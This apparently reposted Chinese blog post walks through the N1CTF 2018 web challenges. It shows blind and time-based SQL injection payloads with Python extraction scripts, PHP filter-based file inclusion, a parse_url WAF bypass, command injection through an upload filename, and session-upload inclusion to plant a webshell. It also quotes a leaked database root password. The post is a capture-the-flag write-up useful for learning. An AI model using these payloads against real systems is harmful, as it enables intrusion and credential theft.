<!--yml
category: 未分类
date: 2022-04-26 14:18:14
-->

# php ctf题解,国际赛-N1CTF 2018-Web题解_无敌小羊历险记的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_34471172/article/details/115596792](https://blog.csdn.net/weixin_34471172/article/details/115596792)

前记

N1CTF 2018是由国内知名战队Nu1L战队组织，由南京赛宁提供技术支持。正好假期空余，于是便来试了试，总的来说，题目难度较高，但是由于存在非预期，所以降低了一些困难性。

77777

拿到题目注意几个信息点：

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

容易发现我们需要的就是admin的password字段

所以容易构造payload:

flag=1111&hi= where (password like 0x25)

即

Update users set points =1111 where (password like 0x25)

此时发现

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

分数修改成功

再试

flag=2222&hi= where (password like 0xff)

发现

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

没有变化，于是可以写出脚本

import requests

import string

import urllib

url = "http://47.97.168.223/index.php"

flag = ""

true_flag = ""

for i in range(1,1000):

payload = flag

for j in "0123456789"+string.letters+"!@#$^&*(){}=+`~_":

data = {

"flag":"233333",

"hi":urllib.unquote(" where (password like 0x%s25)"%(payload+hex(ord(j))[2:]))

}

r =requests.post(url=url,data=data)

if '233333' in r.content:

flag += hex(ord(j))[2:]

true_flag += j

print true_flag

data1 = {

"flag": "1",

"hi": " where 1"

}

s = requests.post(url=url,data=data1)

break

得到flag：N1CTF{he3l3locat233}

算是一道web签到题吧，侥幸手速快，拿了一血233333

77777 2

上一题的翻版，like，部分数字等较多可用均被过滤，发现括号，+，>还在

于是想到构造运算

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

此时的username>”a“为true

Id= 1+true

即为2，那么此处的update也可以用相同的方法

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

注意url编码问题

于是可以写出脚本

import requests

import urllib

url = "http://47.52.137.90:20000/index.php"

flag = ""

for i in range(1,1000):

for j in range(33,127):

payload = urllib.unquote("%%2b( pw > '%s')"%(flag+chr(j)))

data = {

"flag":"10",

"hi":payload

}

r = requests.post(url=url,data=data)

if "| 10

" in r.content:

tmp = urllib.unquote("%%2b( pw > '%s')"%(flag+chr(j-1)))

tmp_data = {

"flag": "10",

"hi": tmp

}

s = requests.post(url=url,data=tmp_data)

if "| 11

" in s.content:

flag += chr(j-1)

print flag

break

得到flag：N1CTF{HAHAH777A7AHA77777AAAA}

背景

进入题目后，点一下login……竟然就可以了= =这里有点坑

拿到url:http://47.52.152.93:20000/user.php?page=guest

发现可以文件包含，随即尝试读源码：

http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=index

得到：

require_once "function.php";

if(isset($_SESSION['login'] )){

Header("Location: user.php?page=info");

}

else{

include "templates/index.html";

}

?>

继续读function文件

http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=function

得到(代码只给出部分)

session_start();

require_once "config.php";

function Hacker()

{

Header("Location: hacker.php");

die();

}

function filter_directory()

{

$keywords = ["flag","manage","ffffllllaaaaggg"];

$uri = parse_url($_SERVER["REQUEST_URI"]);

parse_str($uri['query'], $query);

//    var_dump($query);

//    die();

foreach($keywords as $token)

{

foreach($query as $k => $v)

{

if (stristr($k, $token))

hacker();

if (stristr($v, $token))

hacker();

}

}

}

我们可以发现过滤$keywords = ["flag","manage","ffffllllaaaaggg"];

既然是keyword,那我们尝试一下读ffffllllaaaaggg文件

http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

果不其然，我们被waf了

随即审计一下

$uri = parse_url($_SERVER["REQUEST_URI"]);

parse_str($uri['query'], $query);

这段代码可以说是老套路了，详细请看我的这篇分析：

http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/

我们可以通过

http://47.52.152.93:20000///user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg

这样的方式进行绕过

得到源码

if (FLAG_SIG != 1){

die("you can not visit it directly");

}else {

echo "you can find sth in m4aaannngggeee";

}

?>

继续读

http://47.52.152.93:20000///user.php?page=php://filter/read=convert.base64-encode/resource=m4aaannngggeee

得到

if (FLAG_SIG != 1){

die("you can not visit it directly");

}

include "templates/upload2323233333.html";

?>

去访问

http://47.52.152.93:20000/templates/upload2323233333.html

看到有上传，找到上传的后端：upllloadddd.php

接着读23333333

http://47.52.152.93:20000///user.php?page=php://filter/read=convert.base64-encode/resource=upllloadddd

得到

$allowtype = array("gif","png","jpg");

$size = 10000000;

$path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";

$filename = $_FILES['file']['name'];

if(is_uploaded_file($_FILES['file']['tmp_name'])){

if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){

die("error:can not move");

}

}else{

die("error:not an upload file！");

}

$newfile = $path.$filename;

echo "file upload success

";

echo $filename;

$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");

if($_FILES['file']['error']>0){

unlink($newfile);

die("Upload file error: ");

}

$ext = array_pop(explode(".",$_FILES['file']['name']));

if(!in_array($ext,$allowtype)){

unlink($newfile);

}

?>

可以清楚的看到：

$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");

这里可以命令注入，并且把内容打印出来

我们先本地测试一下

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

发现可以成功将ls的信息打印出来

于是构造：

jpg || ls 文件名

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

最后拿到flag: N1CTF{1d0ab6949bed0ecf014b087e7282c0da}

easy php

拿到url:http://47.97.221.96/index.php?action=login

发现可能存在文件包含

随手尝试

http://47.97.221.96/index.php?action=../../../../etc/passwd

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

发现可以读文件，于是尝试读取源码

但是各种尝试，均以失败告终

最后发现

http://47.97.221.96/index.php~

存在文件泄露

require_once 'user.php';

$C = new Customer();

if(isset($_GET['action']))

require_once 'views/'.$_GET['action'];

else

header('Location: index.php?action=login');

立刻去读user.php，还是用同样的方法：http://47.97.221.96/user.php~

然后去查目录views/

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

发现可列目录，随机拿到全部源码

注：由于源码过多，只给出部分分析源码

首先确定几个可控的值

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

对于password：

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

显然是没办法的

再去看username的过滤

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

基本无解，只能用数字和字母

再去看剩下的两个

发现过滤

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

再看利用点

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

发现调用了sql语句，可能存在注入，但是引号无法利用，但是我们可以知道

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

其中反引号也可以闭合单引号，所以我们可以得到

payload

signature=1`,`123`),((select if((select database()) like 0x25,sleep(5),0)),(select

2),`sky&mood=1

我们将其带入语句中

$db->insert(array('userid','username',' signature=1`,`123`),((select if((select database()) like 0x25,sleep(5),0)),(select

2),`sky ','1'),

'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));

发现成功闭合，并且成功延时5s，随机可以写出注入脚本

import requests

import string

import urllib

url = "http://47.97.221.96:23333/index.php?action=publish"

flag = ""

true_flag = ""

cookie={

"PHPSESSID":"hkjj65gnmdjvs1mcbct3u9nmd0"

}

for i in range(1,1000):

print i

payload = flag

for j in "0123456789."+string.letters+"!@#$^&*(){}=+`~_":

data = {

"signature":urllib.unquote("1`,`123`),((select if((select password from ctf_users limit 1)) like 0x%s25,sleep(3),0)),(select 2),`baidu"%(payload+hex(ord(j))[2:])),

"mood":"1"

}

try:

r =requests.post(url=url,data=data,cookies=cookie,timeout=2.5)

except:

flag += hex(ord(j))[2:]

true_flag += j

print true_flag

break

可以得到管理员密码nu1ladmin

但是继续往后登录遇到瓶颈

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

后来题目又陆续给出提示

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

随即我又注了一下admin的allow_ip，发现是127.0.0.1，猜想可能是需要ssrf以本地用户登录才可

但是到此为止，找了整整一下午，都没发现问题点，无奈开始换思路，发现phpinfo还在，于是去看了看，没想到惊喜的发现了攻击点

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

可以看到upload_progress.enabled开启，并且给出了session.save_path，我们去包含一下试试

http://47.97.221.96/index.php?action=../../../../var/lib/php5/sess_bi1gotgju078l3tvdnlrpnofk2

发现成功包含

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

此时想到一个session_upload的解法，曾经在jarvis-oj也出现过：

http://web.jarvisoj.com:32784/有兴趣可以尝试

再给出一个关于PHP_SESSION_UPLOAD_PROGRESS的官方手册说明：

http://php.net/manual/zh/session.upload-progress.php

我们直接用官方给出的表单加以修改就可使用

官方表单：

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

我的表单：

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

但是需要注意的是，cleanup是on，所以这里我用了条件竞争，一遍疯狂发包，一遍疯狂请求

最后得到：

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

![f9fb202d8045](img/6256d70fdd00460a0ab9d591b1327f69.png)

最后可以在/app/下找到写入的shell，随即用菜刀连接，却没有发现flag，于是想到刚开始的题目给的dockerfile

FROM andreisamuilik/php5.5.9-apache2.4-mysql5.5

ADD nu1lctf.tar.gz /app/

RUN apt-get update

RUN a2enmod rewrite

COPY sql.sql /tmp/sql.sql

COPY run.sh /run.sh

RUN mkdir /home/nu1lctf

COPY clean_danger.sh /home/nu1lctf/clean_danger.sh

RUN chmod +x /run.sh

RUN chmod 777 /tmp/sql.sql

RUN chmod 555 /home/nu1lctf/clean_danger.sh

EXPOSE 80

CMD ["/run.sh"]

发现几个.sh文件，我们读取一下

clean_danger.sh

cd /app/adminpic/ rm *.jpg

run.sh

#!/bin/bash chown www-data:www-data /app -R if [ "$ALLOW_OVERRIDE" = "**False**" ]; then unset ALLOW_OVERRIDE else sed -i "s/AllowOverride None/AllowOverride All/g" /etc/apache2/apache2.conf a2enmod rewrite fi # initialize database mysqld_safe --skip-grant-tables& sleep 5 ## change root password mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('Nu1Lctf%#~:p') WHERE user='root';FLUSH PRIVILEGES;" ## restart mysql service mysql restart ## execute sql file mysql -uroot -pNu1Lctf\%\#\~\:p 

可以发现数据库root的密码：

mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('Nu1Lctf%#~:p')

随即登录数据库，可发现flag：

N1CTF{php_unserialize_ssrf_crlf_injection_is_easy:p}